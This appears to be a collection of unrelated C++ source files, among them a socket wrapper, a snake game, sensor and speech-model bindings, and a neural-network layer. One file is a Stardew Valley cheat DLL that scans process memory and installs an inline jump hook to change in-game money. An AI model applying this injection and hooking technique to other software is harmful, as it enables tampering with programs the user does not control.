    "#include \"config.h\"\n#include <opencv2/core/types.hpp>\n\n#include <string>\n#include <iostream>\n\n#include \"iniparser.hpp\"\n#include <cmath>\n\nusing namespace cv;\n\nConfig::Config(std::string config_file_path)\n{\n    INI::File ft;\n    ft.Load(config_file_path);\n\n    // Window Settings\n    this->kWinName = ft.GetSection(\"Window Settings\")->GetValue(\"window_name\",\"Text replacement\").AsString();\n\n    // Downsample Settings\n    this->downsample_scale = ft.GetSection(\"Downsample Settings\")->GetValue(\"downsample_scale\", 1).AsDouble();\n\n    // Input Settings\n    // calculate the width and height, rounding to 32\n    this->i_width = ft.GetSection(\"Input Settings\")->GetValue(\"width\", 1280).AsInt();\n    this->i_height = ft.GetSection(\"Input Settings\")->GetValue(\"height\", 720).AsInt();\n    this->set_size(this->i_width, this->i_height);\n    \n    this->imread_RGB = ft.GetSection(\"Input Settings\")->GetValue(\"imread_RGB\", 1).AsInt();\n    this->camera_index = ft.GetSection(\"Input Settings\")->GetValue(\"camera_index\", 0).AsInt();\n\n    // Paths\n    this->detector_model_path = ft.GetSection(\"Paths\")->GetValue(\"detector_model_path\",\"resources/frozen_east_text_detection.pb\").AsString();\n    this->recogniser_model_path = ft.GetSection(\"Paths\")->GetValue(\"recogniser_model_path\",\"resources/crnn_cs.onnx\").AsString();\n    this->vocab_path = ft.GetSection(\"Paths\")->GetValue(\"vocab_path\",\"resources/alphabet_94.txt\").AsString();\n    this->font_path = ft.GetSection(\"Paths\")->GetValue(\"font_path\",\"resources/OpenDyslexic-Regular.otf\").AsString();\n\n    // Model Settings\n    this->confidence_threshold = ft.GetSection(\"Model Settings\")->GetValue(\"confidence_threshold\",0.5).AsDouble();\n    this->non_max_suppression_threshold = ft.GetSection(\"Model Settings\")->GetValue(\"non_max_suppression_threshold\",0.4).AsDouble();\n\n    this->rec_scale = ft.GetSection(\"Model Settings\")->GetValue(\"rec_scale\", 1.0 / 127.5).AsDouble();\n\n    double rec_mean_0 = ft.GetSection(\"Model Settings\")->GetValue(\"rec_mean_0\",127.5).AsDouble();\n    double rec_mean_1 = ft.GetSection(\"Model Settings\")->GetValue(\"rec_mean_1\",127.5).AsDouble();\n    double rec_mean_2 = ft.GetSection(\"Model Settings\")->GetValue(\"rec_mean_2\",127.5).AsDouble();\n\n    int rec_input_size_0 = ft.GetSection(\"Model Settings\")->GetValue(\"rec_input_size_0\", 100).AsInt();\n    int rec_input_size_1 = ft.GetSection(\"Model Settings\")->GetValue(\"rec_input_size_1\", 32).AsInt();\n\n    this->rec_mean = Scalar(rec_mean_0, rec_mean_1, rec_mean_2);\n    this->rec_input_size = Size(rec_input_size_0, rec_input_size_1);\n\n    this->det_scale = ft.GetSection(\"Model Settings\")->GetValue(\"det_scale\",1.0).AsDouble();\n    this->det_input_size = Size(this->width, this->height);\n\n    double det_mean_0 = ft.GetSection(\"Model Settings\")->GetValue(\"det_mean_0\",123.68).AsDouble();\n    double det_mean_1 = ft.GetSection(\"Model Settings\")->GetValue(\"det_mean_1\",116.78).AsDouble();\n    double det_mean_2 = ft.GetSection(\"Model Settings\")->GetValue(\"det_mean_2\",103.94).AsDouble();\n    this->det_mean = Scalar(det_mean_0, det_mean_1, det_mean_2);\n\n    this->swap_RB =  ft.GetSection(\"Model Settings\")->GetValue(\"swap_RB\", 1).AsInt() == 1 ? true : false;\n}\n\nvoid Config::set_size(int width, int height)\n{\n    this->width = 32 * floor((double)width / (downsample_scale * 32.0));\n    this->height = 32 * floor((double)height / (downsample_scale * 32.0));\n    this->det_input_size = Size(this->width, this->height);\n\n#ifdef DEBUG\n    std::cout << width << \" x \" << height << \"\\n\";\n#endif\n}",
    "#include \"Socket.h\"\n\nint createnonblocking()\n{\n    int listenfd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, IPPROTO_TCP);\n    if (listenfd < 0)\n    {\n        //perror(\"socket() failed\");\n        //exit(-1);\n        printf(\"%s:%s:%d listen socket create error:%d\\n\", __FILE__, __FUNCTION__, __LINE__, errno);\n        exit(-1);\n    }\n    return listenfd;\n}\n\nSocket::Socket(int fd):fd_(fd)\n{\n\n}\n\nstd::string Socket::ip() const\n{\n    return ip_;\n}\n\nuint16_t Socket::port() const\n{\n    return port_;\n}\n\nSocket::~Socket()\n{\n    ::close(fd_);\n}\n\nint Socket::fd() const\n{\n    return fd_;\n}\n\nvoid Socket::settcpnodelay(bool on)\n{\n    int optval = on?1:0;\n    ::setsockopt(fd_, IPPROTO_TCP, TCP_NODELAY, &optval, sizeof(optval));\n}\n\nvoid Socket::setreuseaddr(bool on)\n{\n    int optval = on?1:0;\n    ::setsockopt(fd_, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));\n}\n\nvoid Socket::setreuseport(bool on)\n{\n    int optval = on?1:0;\n    ::setsockopt(fd_, SOL_SOCKET, SO_REUSEPORT, &optval, sizeof(optval));\n}\n\nvoid Socket::setkeepalive(bool on)\n{\n    int optval = on?1:0;\n    ::setsockopt(fd_, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval));\n}\n\nvoid Socket::bind(const InetAddress& servaddr)\n{\n    if (::bind(fd_, servaddr.addr(), sizeof(sockaddr)) < 0)\n    {\n        perror(\"bind() failed\");\n        close(fd_);\n        exit(-1);\n    }\n\n    setipport(servaddr.ip(), servaddr.port());\n}\n\nvoid Socket::listen(int nn)\n{\n    if (::listen(fd_, nn) != 0)\n    {\n        perror(\"listen() failed\");\n        close(fd_);\n        exit(-1);\n    }\n}\n\nint Socket::accept(InetAddress& clientaddr)\n{\n    struct sockaddr_in peeraddr;\n    socklen_t len = sizeof(peeraddr);\n    int clientfd = accept4(fd_, (struct sockaddr *)&peeraddr, &len, SOCK_NONBLOCK);\n\n   clientaddr.setaddr(peeraddr);\n\n   return clientfd;\n}\n\nvoid Socket::setipport(const std::string &ip, uint16_t port)\n{\n    ip_ = ip;\n    port_ = port;\n}\n",
    "#include<stdio.h>\n#include<iostream>\nusing namespace std;\n\n\nvoid swap(int &a, int &b)\n{\n    int t = a;\n    a = b;\n    b = t;\n}\n\n\nint partition (int arr[], int low, int high)\n{\n    int pivot = arr[high];    // pivot\n    int left = low;\n    int right = high - 1;\n    while(true){\n        while(left <= right && arr[left] < pivot) left++;\n        while(right >= left && arr[right] > pivot) right--;\n        if (left >= right) break;\n        swap(arr[left], arr[right]);\n        left++;\n        right--;\n    }\n    swap(arr[left], arr[high]);\n    return left;\n}\n\n/* H\u00e0m th\u1ef1c hi\u1ec7n gi\u1ea3i thu\u1eadt quick sort */\nvoid quickSort(int arr[], int low, int high)\n{\n    if (low < high)\n    {\n        /* pi l\u00e0 ch\u1ec9 s\u1ed1 n\u01a1i ph\u1ea7n t\u1eed n\u00e0y \u0111\u00e3 \u0111\u1ee9ng \u0111\u00fang v\u1ecb tr\u00ed\n         v\u00e0 l\u00e0 ph\u1ea7n t\u1eed chia m\u1ea3ng l\u00e0m 2 m\u1ea3ng con tr\u00e1i & ph\u1ea3i */\n        int pi = partition(arr, low, high);\n        cout << \"\\nGia tri phan cach: \" << arr[pi] << endl;\n\n        // G\u1ecdi \u0111\u1ec7 quy s\u1eafp x\u1ebfp 2 m\u1ea3ng con tr\u00e1i v\u00e0 ph\u1ea3i\n        cout << \"\\nDoan 1: \";\n        for (int i = low; i <= pi-1; i++)\n        {\n            cout << arr[i] << \" \";\n        }\n        \n        cout << \"\\nDoan 2: \";\n        for (int i = pi+1; i <= high; i++)\n        {\n            cout << arr[i] << \" \";\n        }\n        quickSort(arr, low, pi - 1);\n        quickSort(arr, pi + 1, high);\n    }\n}\n\n/* H\u00e0m xu\u1ea5t m\u1ea3ng */\nvoid printArray(int arr[], int size)\n{\n    int i;\n    for (i=0; i < size; i++)\n        printf(\"%d \", arr[i]);\n    printf(\"\\n\");\n}\n\n\nint main()\n{\n    int arr[] = {10, 80, 30, 90, 40, 50, 70};\n    int n = sizeof(arr)/sizeof(arr[0]);\n    quickSort(arr, 0, n-1);\n    printf(\"Sorted array: \\n\");\n    printArray(arr, n);\n    return 0;\n}",
    "#include \"snake.h\"\n#define DRAW_CALL(c, t, x, y) {\\\n    SetConsoleTextAttribute(console, text_attribute[c]);\\\n    goto_(x, y);\\\n    std::cout << t;\\\n    goto_(x, y + 1);\\\n    std::cout << t;\\\n    SetConsoleTextAttribute(console, FOREGROUND_RED | FOREGROUND_BLUE | FOREGROUND_GREEN);\\\n    }\n\nunsigned int text_attribute[] = {\n    BACKGROUND_GREEN | BACKGROUND_INTENSITY,// empty space\n    BACKGROUND_INTENSITY | BACKGROUND_RED | BACKGROUND_GREEN | BACKGROUND_BLUE,// border\n    FOREGROUND_RED | BACKGROUND_RED | BACKGROUND_INTENSITY,  // fruit\n    BACKGROUND_BLUE | FOREGROUND_BLUE | FOREGROUND_INTENSITY // snake\n};\n\nSnake::Snake(HANDLE console_) : board{ 0 } {\n    console = console_;\n    snake_length = 1;\n    // initial snake coordinates\n    posx = board_length / 2;\n    posy = board_heigth / 2;\n    dirx = 0;\n    diry = 0;\n    x_array[0] = posx;\n    y_array[0] = posy;\n    apple_posx = 0;\n    apple_posy = 0;\n    ath_posx = (board_posx + board_length)*4 + 6;\n    ath_posy = 0;\n    srand((unsigned)time(NULL));\n}\nvoid Snake::init_board(){\n    for (int y = 0; y < board_heigth; y++) {\n        for (int x = 0; x < board_length; x++) {\n            board[0][y] = board[board_length - 1][y] = board[x][0] = board[x][board_heigth - 1] = (int)INDEX::BORDER;\n        }\n    }\n}\nvoid Snake::draw_board(){\n    for (int i = 0; i < board_heigth; i++){\n        for (int j = 0; j < board_length; j++){\n            goto_(board_posx + j, board_posy + i);\n            DRAW_CALL(board[j][i], \"    \", (board_posx + j)*4, (board_posy + i)*2);\n        }\n    }\n}\nvoid Snake::draw_snake_length(){\n    goto_(ath_posx, ath_posy);\n    std::cout << \"SNAKE LENGTH: \" << snake_length;\n\n}\nvoid Snake::goto_(int x, int y){\n    COORD coord;\n    coord.X = x;\n    coord.Y = y;\n    SetConsoleCursorPosition(console, coord);\n}\nvoid Snake::spawn_apple(){\n    while (board[apple_posx = rand() % board_length][apple_posy = rand() % board_heigth] != (int)INDEX::EMPTY_SPACE){}\n    board[apple_posx][apple_posy] = (int)INDEX::FRUIT;\n    DRAW_CALL((int)INDEX::FRUIT, \"    \", (board_posx + apple_posx)*4, (board_posy + apple_posy)*2);\n}\nbool Snake::input_handler(){\n    bool game_over = false;\n    if (GetAsyncKeyState(VK_RIGHT) & 0x8000 && dirx != -1) {\n        dirx = 1; diry = 0;\n    }\n    else if (GetAsyncKeyState(VK_LEFT) & 0x8000 && dirx != 1) {\n        dirx = -1; diry = 0;\n    }\n    else if (GetAsyncKeyState(VK_UP) & 0x8000 && diry != 1) {\n        dirx = 0; diry = -1;\n    }\n    else if (GetAsyncKeyState(VK_DOWN) & 0x8000 && diry != -1) {\n        dirx = 0; diry = 1;\n    }\n    if (!move_snake() || GetAsyncKeyState(VK_SPACE & 0x8000)) game_over = true; // stop the game if we press the space key or if a collision happened\n    return game_over;\n}\nbool Snake::move_snake(){\n    if (board[posx + dirx][posy + diry] == (int)INDEX::EMPTY_SPACE || board[posx + dirx][posy + diry] == (int)INDEX::FRUIT){ // the snake moves only if there is an empty space or a fruit right in front of it\n        board[x_array[snake_length - 1]][y_array[snake_length - 1]] = (int)INDEX::EMPTY_SPACE; // delete the tail of the snake before any change in the board\n        DRAW_CALL((int)INDEX::EMPTY_SPACE, \"    \", (board_posx + x_array[snake_length - 1])*4, (board_posy + y_array[snake_length - 1])*2); // draw deleted tail\n        // in case of collision with a fruit\n        if(board[posx + dirx][posy + diry] == (int)INDEX::FRUIT){\n            // creating a new segment of the snake which is equal to the segment before him, so when it'll move, the new segment's value will not change but the one after it will\n            x_array[snake_length] = x_array[snake_length - 1];\n            y_array[snake_length] = y_array[snake_length - 1];\n            snake_length ++;\n            board[x_array[snake_length - 1]][y_array[snake_length - 1]] = (int)INDEX::SNAKE; // set the new tail of the snake in the board\n            Sleep(200); // short delay\n            draw_snake_length(); // counter\n            spawn_apple();\n        }\n        // we move the array\n        for(int i = 0; i < snake_length - 1; i++){\n            x_array[snake_length - i - 1] = x_array[snake_length - i - 2]; // reminder: the array is read upside down (from the end to the start)\n            y_array[snake_length - i - 1] = y_array[snake_length - i - 2];\n        }\n        // we set the new value of posx and posy (head)\n        posx = posx + dirx;\n        posy = posy + diry;\n        // we set the new position of the head\n        x_array[0] = posx;\n        y_array[0] = posy;\n        board[x_array[0]][y_array[0]] = (int)INDEX::SNAKE; // head of the snake\n        DRAW_CALL((int)INDEX::SNAKE, \"    \", (board_posx + x_array[0])*4, (board_posy + y_array[0])*2); // draw head\n        DRAW_CALL((int)INDEX::SNAKE, \"    \", (board_posx + x_array[snake_length - 1])*4, (board_posy + y_array[snake_length - 1])*2); // draw new tail\n        return true;\n    }\n    else if (dirx == 0 && diry == 0) return true; // if the snake is immobile\n    else return false; // so the snake touched a ",
    "/*!\n * @file DFRobotIRPosition.cpp\n * @brief DFRobot's Positioning ir camera\n * @n CPP file for DFRobot's Positioning ir camera\n *\n * @copyright\t[DFRobot](http://www.dfrobot.com), 2016\n * @copyright\tGNU Lesser General Public License\n *\n * @author [Angelo](Angelo.qiao@dfrobot.com)\n * @version  V1.0\n * @date  2016-02-17\n */\n\n#include \"DFRobotIRPosition.h\"\n\nDFRobotIRPosition::DFRobotIRPosition()\n{\n  \n}\n\nDFRobotIRPosition::~DFRobotIRPosition()\n{\n  \n}\n\nvoid DFRobotIRPosition::writeTwoIICByte(uint8_t first, uint8_t second)\n{\n  Wire.beginTransmission(IRAddress);\n  Wire.write(first);\n  Wire.write(second);\n  Wire.endTransmission();\n}\n\nvoid DFRobotIRPosition::begin()\n{\n  Wire.begin();\n  writeTwoIICByte(0x30,0x01);\n  delay(10);\n  writeTwoIICByte(0x30,0x08);\n  delay(10);\n  writeTwoIICByte(0x06,0x90);\n  delay(10);\n  writeTwoIICByte(0x08,0xC0);\n  delay(10);\n  writeTwoIICByte(0x1A,0x40);\n  delay(10);\n  writeTwoIICByte(0x33,0x33);\n  delay(10);\n  \n  delay(100);\n}\n\nvoid DFRobotIRPosition::requestPosition()\n{\n  Wire.beginTransmission(IRAddress);\n  Wire.write(0x36);\n  Wire.endTransmission();\n  Wire.requestFrom(IRAddress, 16);\n}\n\nbool DFRobotIRPosition::available()\n{\n  if (Wire.available() == 16) {   //read only the data lenth fits.\n    for (int i=0; i<16; i++) {\n      positionData.receivedBuffer[i]=Wire.read();\n    }\n    \n    for (int i=0; i<4; i++) {\n      positionX[i] = (uint16_t)(positionData.positionFrame.rawPosition[i].xLowByte)\n      + ((uint16_t)(positionData.positionFrame.rawPosition[i].xyHighByte & 0x30U) << 4);\n\n      positionY[i] = (uint16_t)(positionData.positionFrame.rawPosition[i].yLowByte)\n      + ((uint16_t)(positionData.positionFrame.rawPosition[i].xyHighByte & 0xC0U) << 2);\n    }\n    return true;\n  }\n  else{   //otherwise skip them.\n    while (Wire.available()) {\n      Wire.read();\n    }\n    return false;\n  }\n}\n\nint DFRobotIRPosition::readX(int index)\n{\n  return positionX[index];\n}\n\nint DFRobotIRPosition::readY(int index)\n{\n  return positionY[index];\n}\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
    "#include \"whisper.h\"\n\n#include <jni.h>\n\n#include <string>\n#include <vector>\n\n#define WTJ_JNI_EXPORT(cls, fn) \\\n  JNICALL Java_io_github_jerinphilip_whisper_##cls##_##fn\n\n// NOLINTNEXTLINE\nusing namespace whisper;\n\nextern \"C\" {\n\n// JNI method to load the model\nJNIEXPORT jlong WTJ_JNI_EXPORT(EngineNative,\n                               create)(JNIEnv *env, jobject /*thiz*/,\n                                       jlong engineType, jstring modelPath,\n                                       jstring vocabPath,\n                                       jboolean isMultilingual) {\n  // NOLINTNEXTLINE(performance-no-int-to-ptr)\n  const char *c_model_path = env->GetStringUTFChars(modelPath, nullptr);\n  const char *c_vocab_path = env->GetStringUTFChars(vocabPath, nullptr);\n  fprintf(stderr, \"model: %s\\n\", c_model_path);\n  fprintf(stderr, \"vocab: %s\\n\", c_vocab_path);\n  auto engine_type = static_cast<EngineType>(engineType);\n  Engine *engine = create_engine(engine_type, c_model_path, c_vocab_path,\n                                 isMultilingual != 0U);\n  env->ReleaseStringUTFChars(modelPath, c_model_path);\n  env->ReleaseStringUTFChars(vocabPath, c_vocab_path);\n  return reinterpret_cast<jlong>(engine);\n}\n\n// JNI method to free the model\nJNIEXPORT void WTJ_JNI_EXPORT(EngineNative, destroy)(JNIEnv * /*env*/,\n                                                     jobject /*thiz*/,\n                                                     jlong nativePtr) {\n  // NOLINTNEXTLINE(performance-no-int-to-ptr)\n  auto *engine = reinterpret_cast<Engine *>(nativePtr);\n  delete engine;\n}\n\n// JNI method to transcribe audio buffer\nJNIEXPORT jstring WTJ_JNI_EXPORT(EngineNative, transcribeBuffer)(\n    JNIEnv *env, jobject /*thiz*/, jlong nativePtr, jfloatArray samples) {\n  // NOLINTNEXTLINE(performance-no-int-to-ptr)\n  auto *engine = reinterpret_cast<Engine *>(nativePtr);\n\n  // Convert jfloatArray to std::vector<float>\n  jsize len = env->GetArrayLength(samples);\n  jfloat *data = env->GetFloatArrayElements(samples, nullptr);\n  std::vector<float> sample_vector(data, data + len);\n  env->ReleaseFloatArrayElements(samples, data, 0);\n\n  std::string result = engine->transcribe(sample_vector);\n  return env->NewStringUTF(result.c_str());\n}\n\n// JNI method to transcribe audio file\nJNIEXPORT jstring WTJ_JNI_EXPORT(EngineNative,\n                                 transcribeFile)(JNIEnv *env, jobject /*thiz*/,\n                                                 jlong nativePtr,\n                                                 jstring waveFile) {\n  // NOLINTNEXTLINE(performance-no-int-to-ptr)\n  auto *engine = reinterpret_cast<Engine *>(nativePtr);\n  const char *c_wave_file = env->GetStringUTFChars(waveFile, nullptr);\n  std::string result = engine->transcribe(c_wave_file);\n  env->ReleaseStringUTFChars(waveFile, c_wave_file);\n  return env->NewStringUTF(result.c_str());\n}\n\n}  // extern \"C\"\n#undef WTJ_JNI_EXPORT\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#define _CRT_SECURE_NO_WARNINGS\r\n#include <Windows.h>\r\n#include <iostream>\r\n#include <string>\r\n#include \"libs/Memory Manager/ProcessManager.hpp\"\r\nusing namespace std;\r\n\r\nvoid WriteAbsoluteJump64(void* absJumpMemory, void* addrToJumpTo)\r\n{\r\n\tuint8_t absJumpInstructions[] =\r\n\t{\r\n\t  0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //mov r10, addr\r\n\t  0x41, 0xFF, 0xE2 //jmp r10\r\n\t};\r\n\r\n\tuint64_t addrToJumpTo64 = (uint64_t)addrToJumpTo;\r\n\tmemcpy(&absJumpInstructions[2], &addrToJumpTo64, sizeof(addrToJumpTo64));\r\n\tmemcpy(absJumpMemory, absJumpInstructions, sizeof(absJumpInstructions));\r\n}\r\nvoid* AllocatePageNearAddress(void* targetAddr)\r\n{\r\n\tSYSTEM_INFO sysInfo;\r\n\tGetSystemInfo(&sysInfo);\r\n\tconst uint64_t PAGE_SIZE = sysInfo.dwPageSize;\r\n\r\n\tuint64_t startAddr = (uint64_t(targetAddr) & ~(PAGE_SIZE - 1)); //round down to nearest page boundary\r\n\tuint64_t minAddr = min(startAddr - 0x7FFFFF00, (uint64_t)sysInfo.lpMinimumApplicationAddress);\r\n\tuint64_t maxAddr = max(startAddr + 0x7FFFFF00, (uint64_t)sysInfo.lpMaximumApplicationAddress);\r\n\r\n\tuint64_t startPage = (startAddr - (startAddr % PAGE_SIZE));\r\n\r\n\tuint64_t pageOffset = 1;\r\n\twhile (1)\r\n\t{\r\n\t\tuint64_t byteOffset = pageOffset * PAGE_SIZE;\r\n\t\tuint64_t highAddr = startPage + byteOffset;\r\n\t\tuint64_t lowAddr = (startPage > byteOffset) ? startPage - byteOffset : 0;\r\n\r\n\t\tbool needsExit = highAddr > maxAddr && lowAddr < minAddr;\r\n\r\n\t\tif (highAddr < maxAddr)\r\n\t\t{\r\n\t\t\tvoid* outAddr = VirtualAlloc((void*)highAddr, PAGE_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\r\n\t\t\tif (outAddr)\r\n\t\t\t\treturn outAddr;\r\n\t\t}\r\n\r\n\t\tif (lowAddr > minAddr)\r\n\t\t{\r\n\t\t\tvoid* outAddr = VirtualAlloc((void*)lowAddr, PAGE_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\r\n\t\t\tif (outAddr != nullptr)\r\n\t\t\t\treturn outAddr;\r\n\t\t}\r\n\r\n\t\tpageOffset++;\r\n\r\n\t\tif (needsExit)\r\n\t\t{\r\n\t\t\tbreak;\r\n\t\t}\r\n\t}\r\n\r\n\treturn nullptr;\r\n}\r\nvoid InstallHook(void* func2hook, void* payloadFunction)\r\n{\r\n\tvoid* relayFuncMemory = AllocatePageNearAddress(func2hook);\r\n\tWriteAbsoluteJump64(relayFuncMemory, payloadFunction); //write relay func instructions\r\n\r\n\t//now that the relay function is built, we need to install the E9 jump into the target func,\r\n\t//this will jump to the relay function\r\n\tDWORD oldProtect;\r\n\tVirtualProtect(func2hook, 1024, PAGE_EXECUTE_READWRITE, &oldProtect);\r\n\r\n\t//32 bit relative jump opcode is E9, takes 1 32 bit operand for jump offset\r\n\tuint8_t jmpInstruction[5] = { 0xE9, 0x0, 0x0, 0x0, 0x0 };\r\n\r\n\t//to fill out the last 4 bytes of jmpInstruction, we need the offset between \r\n\t//the relay function and the instruction immediately AFTER the jmp instruction\r\n\tconst uint64_t relAddr = (uint64_t)relayFuncMemory - ((uint64_t)func2hook + sizeof(jmpInstruction));\r\n\tmemcpy(jmpInstruction + 1, &relAddr, 4);\r\n\r\n\t//install the hook\r\n\tmemcpy(func2hook, jmpInstruction, sizeof(jmpInstruction));\r\n}\r\n\r\nextern \"C\" int get_money_hook();\r\nextern \"C\" int get_money();\r\nextern \"C\" int set_money(DWORD64 money);\r\n\r\nvoid Thread()\r\n{\r\n\tAllocConsole();\r\n\tfreopen(\"CONOUT$\", \"w\", stdout);\r\n\tfreopen(\"CONIN$\", \"r\", stdin);\r\n\r\n\tProcessMgr.Attach(\"Stardew Valley.exe\");\r\n\tauto found_addresses = ProcessMgr.SearchMemory(\"00 48 83 EC 28 48 89 4C 24 30 48 8B 91 C0 04 00 00 48 8B 4A 48 48 8B 54 24 30 39 09\",\r\n\t\t0x0000000000000000, 0xffffffffffffffff);\r\n\r\n\tDWORD old_protect;\r\n\tunsigned char* hook_location = (unsigned char*)(found_addresses[0] + 33);\r\n\r\n\tunsigned char original_opcodes[8];\r\n\tfor (int i = 0; i < 8; i++) {\r\n\t\toriginal_opcodes[i] = *(hook_location + i);\r\n\t}\r\n\r\n\tInstallHook(hook_location, get_money_hook);\r\n\r\n\tSleep(100);\r\n\tint input = 0;\r\n\r\n\twhile (true)\r\n\t{\r\n\t\tsystem(\"cls\");\r\n\r\n\t\tswitch (input)\r\n\t\t{\r\n\t\tcase 0:\r\n\t\t{\r\n\t\t\tstring str_input = \"\";\r\n\t\t\tcout << \"[1] Para Arttir\\n[2] Para Azalt\\n[3] Exit\\n\\n>>> \";\r\n\t\t\tcin >> input;\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tcase 1:\r\n\t\t{\r\n\t\t\tcout << \"ne kadar arttiram : \";\r\n\t\t\tint arttir_input = 0;\r\n\t\t\tcin >> arttir_input;\r\n\r\n\t\t\tset_money(get_money() + arttir_input);\r\n\t\t\tinput = 0;\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tcase 2:\r\n\t\t{\r\n\t\t\tcout << \"ne kadar azaltam : \";\r\n\t\t\tint azalt_input = 0;\r\n\t\t\tcin >> azalt_input;\r\n\r\n\t\t\tset_money(get_money() - azalt_input);\r\n\t\t\tinput = 0;\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tcase 3:\r\n\t\t{\r\n\t\t\tfor (int i = 0; i < 8; i++) {\r\n\t\t\t\t*(hook_location + i) = original_opcodes[i];\r\n\t\t\t}\r\n\r\n\t\t\tFreeConsole();\r\n\t\t\tFreeLibraryAndExitThread(NULL, 0);\r\n\t\t}\r\n\t\tdefault:\r\n\t\t\tbreak;\r\n\t\t}\r\n\t}\r\n}\r\n\r\nBOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)\r\n{\r\n\tif (fdwReason == DLL_PROCESS_ATTACH) {\r\n\t\tCreateThread(0, 0, (LPTHREAD_START_ROUTINE)Thread, 0, 0, 0);\r\n\t}\r\n\r\n\treturn true;\r\n}",
    "#include \"Neural Network Framework.h\"\n#include \"Helper.h\"\n\n\n// Default constructor\nNeural_Layer::Neural_Layer() {\n    // Default constructor body (can be empty or initialized here)\n}\n\n// Parameterized constructor\nNeural_Layer::Neural_Layer(int neuronsInFirstLayer, int neuronsInSecondLayer, const Matrix& inputMatrix)\n        : neurons_in_first_layer(neuronsInFirstLayer), neurons_in_second_layer(neuronsInSecondLayer),\n          input_matrix(inputMatrix),\n          weights_matrix(Matrix_Create_Xavier_Uniform(neuronsInFirstLayer, neuronsInSecondLayer)),\n          bias_matrix(Matrix_Create_Zero(1, neuronsInSecondLayer)), // Initialize biases to zero,\n          weight_and_input_matrix(Matrix_Create_Zero(inputMatrix.row, weights_matrix.column)),\n          weight_input_bias_matrix(Matrix_Create_Zero(inputMatrix.row, weights_matrix.column)),\n          activated_output_matrix(Matrix_Create_Zero(inputMatrix.row, weights_matrix.column)),\n          dC_da_matrix(Matrix_Create_Zero(inputMatrix.row, weights_matrix.column)),\n          dh_da_matrix(Matrix_Create_Zero(inputMatrix.row, weights_matrix.column)),\n          dC_dw_matrix(Matrix_Create_Zero(neuronsInFirstLayer, neuronsInSecondLayer)),\n          dC_db_matrix(Matrix_Create_Zero(1, neuronsInSecondLayer))\n{}\n\nvoid Neural_Layer::Compute_Weighted_Sum() {\n    Matrix_Multiply(&weight_and_input_matrix, input_matrix,weights_matrix);\n    Matrix Broadcasted_Bias= Matrix_Create_Zero(weight_and_input_matrix.row,weight_and_input_matrix.column);\n    Matrix_Broadcast(&Broadcasted_Bias,bias_matrix,weight_and_input_matrix.row,weight_and_input_matrix.column);\n    Matrix_Add(&weight_input_bias_matrix, weight_and_input_matrix, Broadcasted_Bias);\n    Matrix_Free(&Broadcasted_Bias);\n}\n\nvoid Neural_Layer::Activate() {\n    // Iterate over each element of the matrix\n    for (int i = 0; i < weight_input_bias_matrix.row; ++i) {\n        for (int j = 0; j < weight_input_bias_matrix.column; ++j) {\n            // Compute the correct index for a 2D matrix stored in a 1D array\n            int index = i * weight_input_bias_matrix.column + j;\n            activated_output_matrix.data[index] = LeakyReLU(weight_input_bias_matrix.data[index]);\n        }\n    }\n}\n\nvoid Neural_Layer::Activate_Last()  {\n    // Iterate over each element of the matrix\n    for (int i = 0; i < weight_input_bias_matrix.row; ++i) {\n        for (int j = 0; j < weight_input_bias_matrix.column; ++j) {\n            // Compute the correct index for a 2D matrix stored in a 1D array\n            int index = i * weight_input_bias_matrix.column + j;\n            activated_output_matrix.data[index] = Linear_Activation(weight_input_bias_matrix.data[index]);\n        }\n    }\n}\n\n\nvoid Neural_Layer::Dh_Da_Function() {\n    // Iterate over all elements of the matrix (rows x columns)\n    for (int i = 0; i < weight_input_bias_matrix.row; ++i) {\n        for (int j = 0; j < weight_input_bias_matrix.column; ++j) {\n            int index = i * weight_input_bias_matrix.column + j;  // Calculate the index for a 1D array representation of the matrix\n            dh_da_matrix.data[index] = (weight_input_bias_matrix.data[index] > 0) ? 1.0f : 0.01f;\n        }\n    }\n}\n\n\n//void Neural_Layer::Dh_Da_Function() {\n//    // Iterate over all elements of the matrix (rows x columns)\n//    for (int i = 0; i < weight_input_bias_matrix.row; ++i) 